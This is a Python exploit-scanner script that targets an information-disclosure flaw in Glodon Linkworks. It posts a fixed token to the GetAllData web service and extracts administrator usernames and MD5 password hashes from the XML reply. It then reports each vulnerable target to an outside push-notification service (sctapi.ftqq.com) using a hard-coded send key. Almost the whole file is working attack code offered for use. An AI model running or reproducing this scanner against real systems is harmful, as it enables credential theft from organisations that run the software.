# Glodon_Linkworks_GetAllData_information_scan.py

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
import os
import json
import urllib.parse
import xml.etree.ElementTree as ET
import urllib.request

def sc_send(text, desp='', key='[SENDKEY]'):
    postdata = urllib.parse.urlencode({'text': text, 'desp': desp}).encode('utf-8')
    urlserver = f'https://sctapi.ftqq.com/{key}.send'
    req = urllib.request.Request(urlserver, data=postdata, method='POST')
    with urllib.request.urlopen(req) as response:
        result = response.read().decode('utf-8')
    return result
key = "SCT202695TeKe1ATgRMke7f7jyrOOkH9GX"

def scan_Glodon_Linkworks_GetAllData_information(url, proxies, headers, append_to_output):

    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    if url.endswith("/"):
        path = "WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx/GetAllData"
    else:
        path = "/WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx/GetAllData"

    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; SM-P585Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    encodetext = url + path
    data='''Token=!@#$asdf$#@!&DataType=user'''
    append_to_output("===================================================================", "green")
    append_to_output(f"扫描目标: {url}", "yellow")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req1 = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=20, proxies=proxies)

        if req1.status_code == 200 and 'admin' in req1.text:
            append_to_output(f"[+] {url} 存在广联达Linkworks GetAllData 信息泄露漏洞！！！！", "red")
            # If the response is in bytes, convert it to a string
            response_str = req1.text if isinstance(req1.text, str) else req1.content.decode('utf-8')

            # Remove the XML declaration
            response_str = response_str.replace('<?xml version="1.0" encoding="utf-8"?>', '')

            # Parse the string as XML
            root = ET.fromstring(response_str)

            # Find the XML element containing the data
            xml_content = root.find('{http://tempuri.org/}XML').text

            # Parse the inner XML content as XML
            inner_root = ET.fromstring(xml_content)

            # Extract the values
            usr_code = inner_root.find('.//USR_CODE').text
            usr_pwdmd5 = inner_root.find('.//USR_PWDMD5').text
            append_to_output(f"[+] USR_CODE : {usr_code} ！！！！", "red")
            append_to_output(f"[+] USR_PWDMD5 : {usr_pwdmd5} ！！！！", "red")
            ret = sc_send('广联达Linkworks GetAllData 信息泄露漏洞', f"漏洞连接: {url}\r\n漏洞类型: 信息泄露", key)
        else:
            append_to_output(f"[-] {url} 不存在广联达Linkworks GetAllData 信息泄露漏洞", "green")
    except Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
